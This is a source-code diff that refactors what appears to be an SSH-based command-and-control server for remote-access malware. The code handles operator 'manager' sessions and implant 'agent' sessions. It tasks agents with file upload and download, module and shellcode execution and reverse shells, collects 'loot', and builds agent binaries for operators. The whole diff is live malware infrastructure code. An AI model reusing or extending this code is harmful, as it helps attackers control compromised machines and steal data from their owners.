@@ -1,4 +1,3 @@
-#include "common.h"
 #include "server.h"
 
 #ifdef HAVE_ARGP_H
@@ -140,7 +139,7 @@ static error_t parse_opt (int key, char *arg, struct argp_state *state) {
             dbg = misc_index_of(arg, ':', 0);
             id = misc_substring(arg, dbg, strlen(arg));
 
-            Server::register_agent(id, pass);
+            AgentInformationHandler::register_agent(id, pass);
             sprintf(buff, "Registered agent with %s and %s\n", id, pass);
             free(id);
             break;
@@ -174,7 +173,7 @@ static struct argp argp = {options, parse_opt, args_doc, doc, NULL, NULL, NULL};
 /*Global variables and data structures*/
 pthread_t thread_array[MAX_CONN];
 
-Server::Server(){
+ConnectionInstance::ConnectionInstance(){
     this->logger = new Log();
     this->list = new List();
 
@@ -228,16 +227,16 @@ Server::Server(){
     }
 }
 
-Server::~Server(){
+ConnectionInstance::~ConnectionInstance(){
     return;
 }
 
-void Server::get_info(class ServerTransport *transport, char *ptr){
+void ConnectionInstance::get_info(class ServerTransport *transport, char *ptr){
     return;
 }
 
 /*Handler for manager connections and flow*/
-void Server::manager_handler(class ServerTransport *transport){
+void ConnectionInstance::manager_handler(class ServerTransport *transport){
     pClientNode node = transport->get_node();
     char resp[2048];
 
@@ -272,7 +271,7 @@ void Server::manager_handler(class ServerTransport *transport){
         if (rc == SSH_ERROR)
         {
             sprintf(logbuff, "Manager %s: Failed to handle agent: %s\n", node->data->id, ssh_get_error(node->data->session));
-            (logbuff);
+            this->logger->log(logbuff);
             return;
         }
         
@@ -300,7 +299,7 @@ void Server::manager_handler(class ServerTransport *transport){
             break;
 
         case MANAG_GET_LOOT:
-            this->get_loot(transport);
+            transport->get_loot(ptr);
             break;
 
         case MANAG_UP_FILE:
@@ -314,8 +313,8 @@ void Server::manager_handler(class ServerTransport *transport){
             count = misc_index_of(ptr, ':', 0);
             dat_ptr = misc_substring(ptr, count, strlen(ptr));
             
-            this->download_file(transport, d_ptr, 1, dat_ptr);
-            this->task_agent(AGENT_DOWN_FILE, dat_ptr, d_ptr);
+            transport->download_file(d_ptr, 1, dat_ptr);
+            AgentInformationHandler::task(AGENT_DOWN_FILE, dat_ptr, d_ptr);
             break;
 
         case MANAG_REQ_RVSH:
@@ -333,9 +332,9 @@ void Server::manager_handler(class ServerTransport *transport){
             count = misc_index_of(ptr, ':', 0);
             dat_ptr = misc_substring(ptr, count, strlen(ptr));
             
-            this->download_file(transport, d_ptr, 1, dat_ptr);
+            transport->download_file(d_ptr, 1, dat_ptr);
             
-            this->task_agent(AGENT_EXEC_MODULE, dat_ptr, d_ptr);
+            AgentInformationHandler::task(AGENT_EXEC_MODULE, dat_ptr, d_ptr);
             break;
 
         case MANAG_CHECK_LOOT:
@@ -353,7 +352,7 @@ void Server::manager_handler(class ServerTransport *transport){
             }
             count = misc_index_of(ptr, ':', 0);
             dat_ptr = misc_substring(ptr, count, strlen(ptr));
-            this->task_agent(AGENT_UP_FILE, dat_ptr, d_ptr);
+            AgentInformationHandler::task(AGENT_UP_FILE, dat_ptr, d_ptr);
             rc = ssh_channel_write(node->data->chan, "ok", 2);
             if (rc == SSH_ERROR)
             {
@@ -373,7 +372,7 @@ void Server::manager_handler(class ServerTransport *transport){
             count = misc_index_of(ptr, ':', 0);
             dat_ptr = misc_substring(ptr, count, strlen(ptr));
             
-            this->task_agent(AGENT_EXEC_SC, dat_ptr, d_ptr);
+            AgentInformationHandler::task(AGENT_EXEC_SC, dat_ptr, d_ptr);
             rc = ssh_channel_write(node->data->chan, "ok", 2);
             if (rc == SSH_ERROR)
             {
@@ -395,7 +394,7 @@ void Server::manager_handler(class ServerTransport *transport){
 
             transport->make_agent(dat_ptr, d_ptr);
             dat_ptr = NULL;
-            this->upload_file(transport, "out/client.out", 0);
+            transport->upload_file("out/client.out", 0);
             break;
 
         case MANAG_REG_AGENT:
@@ -426,8 +425,12 @@ void Server::manager_handler(class ServerTransport *transport){
     
 }
 
+void ConnectionInstance::get_ports(class ServerTransport* transport, char *ptr){
+
+}
+
 /*Handles reverse shell connections and forwarding*/
-void Server::reverse_shell(class ServerTransport *transport){
+void ConnectionInstance::reverse_shell(class ServerTransport *transport){
     int port = (rand() % (65535-2048))+ 2048;
     pClientNode node = transport->get_node();
     char agent_buffer[BUFSIZ];
@@ -517,7 +520,7 @@ void Server::reverse_shell(class ServerTransport *transport){
 }
 
 /*Handler for agent connections and flow*/
-void Server::agent_handler(class ServerTransport *transport){
+void ConnectionInstance::agent_handler(class ServerTransport *transport){
     pClientNode node = transport->get_node();
     char resp[2048];
     
@@ -587,11 +590,11 @@ void Server::agent_handler(class ServerTransport *transport){
 
         case AGENT_DOWN_FILE:
             sprintf(buff, "agents/%s/tasking/%s", node->data->id, ptr);
-            this->upload_file(transport, buff, 0);
+            transport->upload_file(buff, 0);
             break;
 
         case AGENT_UP_FILE:
-            this->download_file(transport, ptr, 0, NULL);
+            transport->download_file(ptr, 0, NULL);
             break;
 
         case AGENT_REV_SHELL:
@@ -601,7 +604,7 @@ void Server::agent_handler(class ServerTransport *transport){
 
         case AGENT_EXEC_MODULE:
             sprintf(buff, "agents/%s/tasking/%s", node->data->id, ptr);
-            this->upload_file(transport, buff, 1);
+            transport->upload_file(buff, 1);
             break;
 
         default:
@@ -615,7 +618,7 @@ void Server::agent_handler(class ServerTransport *transport){
 
 
 /*Initialized the connection and prepares data structures for handlers*/
-void *Server::handle_connection(void *input){
+void *ConnectionInstance::handle_connection(void *input){
     int auth=0;
     ssh_message message;
     char *name = NULL;
@@ -629,7 +632,7 @@ void *Server::handle_connection(void *input){
             case SSH_REQUEST_AUTH:
                 switch(ssh_message_subtype(message)){
                     case SSH_AUTH_METHOD_PASSWORD:
-                        if(authenticate_doauth(ssh_message_auth_user(message), ssh_message_auth_password(message))){
+                        if(Authenticate::doauth(ssh_message_auth_user(message), ssh_message_auth_password(message))){
                             auth=1;
                             name = (char*)malloc(strlen(ssh_message_auth_user(message)));
                             memset(name, 0, strlen(ssh_message_auth_user(message)));
@@ -670,13 +673,40 @@ void *Server::handle_connection(void *input){
         node->data = pass;
         node->nxt = NULL;
         node->prev = NULL;
-        this->list->add_node(node);
-                
-        this->authenticate(node);
+        class ConnectionInstance *instance = new ConnectionInstance();
+        class Log *logger = instance->get_logger();
+        class List *list = instance->get_list();
+        class ServerTransport *transport = new Ssh_Transport(logger, list, node);
+        int handler = transport->determine_handler();
+        if (handler == AGENT_TYPE)
+        {
+            instance->agent_handler(transport);
+        } else if(handler == MANAG_TYPE)
+        {
+            instance->manager_handler(transport);
+        } else
+        {
+            printf("Woops got an unknown type: %d\n", handler);
+        }
+        
+        
+        
     }
 
     return NULL;
         
+}
+
+void ConnectionInstance::set_transport(class ServerTransport *transport){
+    this->transport = transport;
+}
+
+class Log *ConnectionInstance::get_logger(){
+    return this->logger;
+}
+
+class List *ConnectionInstance::get_list(){
+    return this->list;
 }
 
 
@@ -717,7 +747,7 @@ int main(int argc, char **argv){
 	int master_socket;
     int ctr = 0;
     pthread_t thread;
-    class Server *server = new Server();
+    class ConnectionInstance *server = new ConnectionInstance();
     
     if( (master_socket = socket(AF_INET , SOCK_STREAM , 0)) == 0){   
         perror("Server: Socket Failure");   
@@ -747,9 +777,6 @@ int main(int argc, char **argv){
 #else
     (void) argc;
     (void) argv;
-#endif
-#ifdef WITH_PCAP
-    set_pcap(session);
 #endif
 
     // bind the listener to the port
@@ -794,10 +821,6 @@ int main(int argc, char **argv){
     }
 
     ssh_bind_free(sshbind);
-
-#ifdef WITH_PCAP
-    cleanup_pcap();
-#endif
     ssh_finalize();
 
     printf("Server: Terminated successfully\n");
